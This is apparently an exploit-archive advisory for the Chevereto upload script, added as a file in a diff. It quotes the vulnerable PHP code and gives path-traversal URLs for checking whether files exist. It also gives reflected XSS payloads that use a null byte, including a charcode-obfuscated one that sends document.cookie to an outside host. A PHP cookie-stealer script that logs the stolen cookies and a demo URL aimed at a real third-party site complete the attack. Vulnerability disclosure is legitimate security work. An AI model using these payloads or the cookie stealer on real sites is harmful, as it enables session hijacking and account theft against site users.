@@ -1,0 +1,108 @@
+id: 18235
+date: 05/10/2012
+title: Chevereto Upload Script Cross Site Scripting / User Enumeration
+author: AkaStep
+cves: 
+
+========================================================================================
+Vulnerable Software: Chevereto upload script
+Downloaded from: http://code.google.com/p/chevereto/downloads/list
+(http://code.google.com/p/chevereto/downloads/detail?name=chevereto_nb1.91.zip&can=2&q=)
+Official site: http://chevereto.com/
+chevereto_nb1.91.zip Nightly Build 1.91 Featured Oct 2010 471 KB 32167
+========================================================================================
+About software:See from vendor: http://chevereto.com/
+chevereto is outstanding Image Hosting Script (c) chevereto.com
+========================================================================================
+Tested:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL: 5.5.23
+========================================================================================
+Vuln Desc:
+Vulnerable Code Section
+//http://site.tld/whereunpacked/Upload/engine.php
+
+if ($modo==2 || $modo==3) {
+// INFORMACION (ANCHO, ALTO y PESO)
+if ($modo==2) {
+if ($_GET['v']) {
+$id = $_GET['v'];
+$imagen = DIR_IM.$id;
+if (file_exists($imagen)==true) {
+$titulo = SEEING.' '.$id.' '.AT.' ';
+$info = getimagesize($imagen); //Obtenemos la informacion
+$statinfo = @stat($imagen);
+$ancho = $info[0];
+$alto = $info[1];
+$mime = $info['mime'];
+$tamano = $statinfo['size']; //Bytes
+$tamano_kb = round($tamano*0.0009765625, 2);
+$canales = $info['channels'];
+} else {
+unset($modo);
+$modo = 1;
+$spit = true;
+$errormsg = NOT_EXISTS;
+$titulo = NOT_EXISTS_TITLE.ESP_TITULO;
+}
+}
+}
+
+// LAS URL
+$URLimg = URL_SCRIPT.DIR_IM.$name;
+$URLthm = URL_SCRIPT.DIR_TH.$name;
+$URLvim = URL_SCRIPT.'?v='.$name;
+$URLshr = $URLvim; // Para no cambiar mas abajo
+$eu_img = urlencode($URLimg);
+
+
+File existense enumeration:
+http://192.168.0.15/learn/chevereto/chevereto_nb1.91/Upload/?v=../index.php
+
+Non persistent cROSS siTE sCRIPTING (XSS)
+http://192.168.0.15/learn/chevereto/chevereto_nb1.91/Upload/?v=../index.php%00<script>alert(1);</script>
+
+Note:*Null byte* usage is neccessary here when exploiting XSS.See the vulnerable code section.
+
+
+=======XSS STEAL COOKIE========
+http://192.168.0.15/learn/chevereto/chevereto_nb1.91/Upload/?v=../index.php%00</title><script>document.write
+(String.fromCharCode(60,115,99,114,105,112,116,62,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,1
+16,116,112,58,47,47,49,57,50,46,49,54,56,46,48,46,49,53,47,108,101,97,114,110,47,119,111,114,107,47,120,115,115,46,112,1
+04,112,63,116,120,116,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,60,47,115,99,114,105,112,116,
+62));</script>
+============EOF================
+our charcoded XSS payload in this case is:
+<script>location.replace("http://192.168.0.15/learn/work/xss.php?txt="+document.cookie)</script>
+
+And Finally:
+//xss.php = is our cookie stealer.
+
+<?php
+error_reporting('off');
+if(isset($_GET['txt']))
+{
+$cleanupitfirst=base64_encode(htmlentities($_GET['txt']));
+$file='./s.txt';
+$handle=fopen($file,'a+');
+fwrite($handle,PHP_EOL .'============Decode It==========='. PHP_EOL .$cleanupitfirst. PHP_EOL . '============END
+OF==========='.PHP_EOL);
+fclose($handle);
+}
+die('<script>location.replace("http://return_back.tld/blabla/");</script>');
+
+
+Demo: http://pics.openarmenia.com/?v=../index.php%00%3Cscript%3Ealert%281%29;%3C/script%3E
+//Chevereto NB1.6 rev2
+========================================================================================
+Due trust to this issuse we can say previous versions too is affected by this vulns.
+=================================== EOF =================================================
+
+
+
+#  0day.today [2023-03-25]  #
